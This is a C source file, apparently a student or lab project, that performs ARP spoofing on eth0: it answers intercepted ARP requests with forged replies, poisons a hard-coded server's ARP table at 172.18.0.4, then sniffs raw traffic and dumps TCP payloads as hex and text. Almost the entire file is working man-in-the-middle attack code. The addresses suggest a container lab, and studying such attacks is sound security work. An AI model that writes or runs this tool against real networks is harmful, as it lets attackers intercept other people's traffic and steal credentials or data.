#define _GNU_SOURCE /* To get def of NI_MAXSERV and NI_MAXHOST */

#include <arpa/inet.h>
#include <ifaddrs.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <ctype.h>

#define BUFFER_SIZE 1024

#define MAC_SIZE 6
#define IP_SIZE 4

#define MAC_STRING_SIZE 18

#define HW_TYPE_ETHER 1
#define P_TYPE_ARP 0x800

#define ARP_REPLY 2
#define ARP_REQUEST 1

#define KNOWN_PROT 7
const char *protocol[KNOWN_PROT] = {
    "ICMP", "IGMP", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "TCP",
};

#define ETHERNET_PACKET_SIZE sizeof(struct ether_header)

struct hwaddr {
    uint16_t first;
    uint16_t second;
    uint16_t third;
} __attribute__((packed));

typedef struct arp_packet {
    uint16_t hwtype;
    uint16_t ptype;
    uint8_t hlen;
    uint8_t plen;
    uint16_t operation;
    struct hwaddr hwsender;
    uint32_t spa;
    struct hwaddr hwtarget;
    uint32_t tpa;
} __attribute__((packed)) t_arp_packet;

enum ft_error { FATAL, OK, NO_OK };

char *hwaddr_to_string(unsigned char *addr, char *str, size_t size) {
    if (addr == NULL || str == NULL || size < MAC_STRING_SIZE) return NULL;

    snprintf(str, size, "%02x:%02x:%02x:%02x:%02x:%02x", addr[0], addr[1],
             addr[2], addr[3], addr[4], addr[5]);

    return str;
}

char *raw_ip_to_str(unsigned char *raw_ip, char *str, size_t size) {
    snprintf(str, size, "%d:%d:%d:%d", raw_ip[0], raw_ip[1], raw_ip[2],
             raw_ip[3]);
    return str;
}

uint16_t reverse_endian_16(const uint16_t src) {
    uint16_t rev;
    unsigned char buff[2];
    buff[0] = ((unsigned char *)&src)[1];
    buff[1] = ((unsigned char *)&src)[0];
    memcpy(&rev, &buff, 2);
    return rev;
}

// t_arp_packet craft_arp_packet(const unsigned char source_mac_addr[MAC_SIZE],
//                               const t_arp_packet intercepted_packet) {
//     t_arp_packet packet = {0};
//     packet.hwtype = reverse_endian_16(HW_TYPE_ETHER);
//     packet.ptype = reverse_endian_16(P_TYPE_ARP);
//     packet.hlen = MAC_SIZE;
//     packet.plen = IP_SIZE;
//     packet.operation = reverse_endian_16(ARP_REPLY);
//     memcpy(&packet.hwsender, source_mac_addr, MAC_SIZE);
//     memcpy(&packet.hwtarget, &intercepted_packet.hwsender,
//            sizeof(struct hwaddr));
//     memcpy(&packet.spa, &intercepted_packet.tpa, sizeof(packet.spa));
//     memcpy(&packet.tpa, &intercepted_packet.spa, sizeof(packet.tpa));
//     return packet;
// }

t_arp_packet craft_arp_packet_2(const unsigned char self_mac_addr[MAC_SIZE],
                                const struct hwaddr orig_sender,
                                const uint32_t orig_spa,
                                const uint32_t orig_tpa) {
    t_arp_packet packet = {0};
    packet.hwtype = reverse_endian_16(HW_TYPE_ETHER);
    packet.ptype = reverse_endian_16(P_TYPE_ARP);
    packet.hlen = MAC_SIZE;
    packet.plen = IP_SIZE;
    packet.operation = reverse_endian_16(ARP_REPLY);
    memcpy(&packet.hwsender, self_mac_addr, MAC_SIZE);
    memcpy(&packet.hwtarget, &orig_sender, sizeof(struct hwaddr));
    memcpy(&packet.spa, &orig_tpa, sizeof(packet.spa));
    memcpy(&packet.tpa, &orig_spa, sizeof(packet.tpa));
    return packet;
}

enum ft_error get_mac_addr(unsigned char mac_addr[MAC_SIZE]) {
    struct ifaddrs *ifaddr;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return FATAL;
    }
    char found = 0;
    for (struct ifaddrs *ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        int family = ifa->ifa_addr->sa_family;
        if (family != AF_PACKET) continue;

        if (strcmp(ifa->ifa_name, "eth0") != 0) continue;
        struct sockaddr_ll *s = (struct sockaddr_ll *)ifa->ifa_addr;
        memcpy(mac_addr, s->sll_addr, 6);
        found = 1;
        break;
    }
    freeifaddrs(ifaddr);
    return found ? OK : FATAL;
}

void dump_arp_packet(const t_arp_packet packet) {
    printf("\n***************************************\n");
    char str[MAC_STRING_SIZE] = {0};
    char str2[MAC_STRING_SIZE] = {0};
    printf("operation is %x: %s\n", packet.operation,
           packet.operation == reverse_endian_16(ARP_REQUEST) ? "REQUEST"
                                                              : "REPLY");
    hwaddr_to_string((unsigned char *)&packet.hwsender, str, MAC_STRING_SIZE);
    printf("hwsender address %s\n", str);
    hwaddr_to_string((unsigned char *)&packet.hwtarget, str2, MAC_STRING_SIZE);
    printf("target address %s\n", str2);
    char str_ip1[16] = {0};
    char str_ip2[16] = {0};
    raw_ip_to_str((unsigned char *)&packet.spa, str_ip1, 16);
    raw_ip_to_str((unsigned char *)&packet.tpa, str_ip2, 16);
    printf("source ip addr %s\n", str_ip1);
    printf("target ip addr %s\n", str_ip2);
    printf("\n***************************************\n");
}

enum ft_error send_packet(const int sock_fd, const t_arp_packet packet) {
    unsigned int if_idx = if_nametoindex("eth0");
    printf("idx %d\n", if_idx);
    if (if_idx == 0) {
        perror("name to index: ");
        return NO_OK;
    }
    struct sockaddr_ll addr = {0};
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETHERTYPE_ARP);
    addr.sll_ifindex = if_idx;
    addr.sll_halen = MAC_SIZE;
    memcpy(addr.sll_addr, &packet.hwtarget, sizeof(struct hwaddr));

    ssize_t bytes_sent =
        sendto(sock_fd, &packet, sizeof(t_arp_packet), MSG_CONFIRM,
               (struct sockaddr *)&addr, sizeof(struct sockaddr_ll));
    if (bytes_sent == -1) {
        perror("Sendto :");
        return NO_OK;
    } else {
        char str[MAC_STRING_SIZE] = {0};
        hwaddr_to_string((unsigned char *)&packet.hwtarget, str,
                         MAC_STRING_SIZE);
        printf("Sent packet of size %ld to %s\n", sizeof(t_arp_packet), str);
    }
    return OK;
}

void intercept_packet(unsigned char mac_addr[MAC_SIZE]) {
    (void)mac_addr;
    int socket_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (socket_fd == -1) {
        perror("openening socket for intercepting");
        return;
    }
    printf("Intercepting packet\n");
    while (1) {
        char buffer[BUFFER_SIZE];
        ssize_t bytes_recv = recvfrom(socket_fd, buffer, BUFFER_SIZE, 0, 0, 0);
        if (bytes_recv == -1) {
            perror("recvfrom intercepting: ");
            continue;
        }

        printf("Intercepted packet of size : %ld \n", bytes_recv);
        struct ether_header eth_hdr = {0};
        memcpy(&eth_hdr, buffer, sizeof(struct ether_header));
        printf("ether dump: \n");
        for (size_t i = 0; i < sizeof(struct ether_header); i++) {
            printf("%x ", buffer[i]);
        }
        printf("\n********\n");

        char mac_sender[MAC_STRING_SIZE], mac_dest[MAC_STRING_SIZE] = {0};
        hwaddr_to_string((unsigned char *)&eth_hdr.ether_dhost, mac_dest,
                         MAC_STRING_SIZE);
        hwaddr_to_string((unsigned char *)&eth_hdr.ether_shost, mac_sender,
                         MAC_STRING_SIZE);

        printf("mac sender : %s\n", mac_sender);
        printf("mac dest : %s\n", mac_dest);
        printf("Type %x\n", eth_hdr.ether_type);
        if (reverse_endian_16(eth_hdr.ether_type) == ETH_P_IP) {
            printf("!!!!!!!!!!!!!!!!!!!!!!!\n");
            size_t ip_len_packet = bytes_recv - sizeof(struct ether_header);
            printf("Intercepted IP packet of total len %zu\n", ip_len_packet);
            struct ip ip_hdr = {0};
            memcpy(&ip_hdr, &buffer[sizeof(struct ether_header)],
                   sizeof(ip_hdr));
            int ip_hdr_len =
                ip_hdr.ip_hl *
                4;  // nb of 32 bit word => ip_hl * 4 for bytes number
            printf("ip hdr len %d bytes\n", ip_hdr_len);
            printf("Ip src %s\n", inet_ntoa(ip_hdr.ip_src));
            printf("Ip dst %s\n", inet_ntoa(ip_hdr.ip_dst));
            printf("Protocol %d", ip_hdr.ip_p);
            if (ip_hdr.ip_p < KNOWN_PROT) printf(" %s", protocol[ip_hdr.ip_p]);
            printf("\n");
            if (ip_hdr.ip_p != 6)  // TCP protocol
                continue;
            struct tcphdr tcp_hdr = {0};
            memcpy(&tcp_hdr, &buffer[sizeof(struct ether_header) + ip_hdr_len],
                   bytes_recv - sizeof(struct ether_header) - ip_hdr_len);
            printf("port dest : %d\n", tcp_hdr.dest);
            printf("port source : %d\n", tcp_hdr.source);
            int start_data = tcp_hdr.th_off;
            start_data = sizeof(struct ether_header) + ip_hdr_len + start_data;
            if (start_data >= bytes_recv) {
                printf("No tcp data\n");
            } else {
                size_t len_data = bytes_recv - start_data;
                printf("Dumping tcp data hex:\n");
                for (size_t i = 0; i < len_data; i++) {
                    	printf("%x ", buffer[start_data + i]);
                }
                printf("\n");
				printf("Dumping tcp data char:\n");
                for (size_t i = 0; i < len_data; i++) {
					if (isprint(buffer[start_data + i]))
                    	printf("%c ", buffer[start_data + i]);
                }
                printf("\n");
            }

            printf("!!!!!!!!!!!!!!!!!!!!!!!\n");
            fflush(NULL);
        }
    }
    printf("Stopping intercepting packet\n");
}

int main() {
    unsigned char mac_addr[MAC_SIZE];
    if (get_mac_addr(mac_addr) != OK) {
        printf("Error getting host mac address\n");
        exit(1);
    }
    printf("My mac is : ");
    for (size_t i = 0; i < MAC_SIZE; i++) {
        printf("%x:", mac_addr[i]);
    }
    printf("\n");
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETHERTYPE_ARP));
    int sock_send = socket(AF_PACKET, SOCK_DGRAM, htons(ETHERTYPE_ARP));
    if (sock == -1 || sock_send == -1) {
        perror("creating socket :");
        exit(1);
    }

    while (1) {
        unsigned char buffer[BUFFER_SIZE] = {0};

        ssize_t bytes_recv = recvfrom(sock, buffer, BUFFER_SIZE, 0, NULL, NULL);
        if (bytes_recv == -1) {
            perror("Receiving message: ");
            close(sock);
            close(sock_send);
            exit(1);
        }
        printf("Received msg of len %ld\n", bytes_recv);
        if (bytes_recv != sizeof(t_arp_packet) + ETHERNET_PACKET_SIZE) {
            printf("Wrong size packet\n");
            continue;
        }
        printf("\n*****************************\n");
        for (ssize_t i = 0; i < bytes_recv; i++) {
            printf("%x ", buffer[i]);
        }
        printf("\n*****************************\n");
        fflush(NULL);
        t_arp_packet packet = {0};
        struct ether_header eth_hdr = {0};
        memcpy(&eth_hdr, buffer, sizeof(struct ether_header));
        memcpy(&packet, &buffer[ETHERNET_PACKET_SIZE], sizeof(t_arp_packet));

        t_arp_packet crafted_packet = craft_arp_packet_2(
            mac_addr, packet.hwsender, packet.spa, packet.tpa);

        // TO DO parse argument from CLI
        uint8_t server_mac[6] = {0x02, 0x42, 0xac, 0x12, 0x00, 0x02};
        // 02:42:ac:12:00:02
        uint8_t ip_server[4] = {172, 18, 0, 4};
        t_arp_packet craft_packet_server =
            craft_arp_packet_2(mac_addr, *(struct hwaddr *)server_mac,
                               packet.tpa, *(uint32_t *)ip_server);
        dump_arp_packet(crafted_packet);
        dump_arp_packet(craft_packet_server);
        dump_arp_packet(packet);
        // sometimes need to wait a bit to change the arp table of target
        // race of packet ??
        sleep(2);
        send_packet(sock_send, crafted_packet);
        send_packet(sock_send, craft_packet_server);
        fflush(NULL);

        intercept_packet(mac_addr);
    }
    close(sock);
    close(sock_send);
    return 0;
}
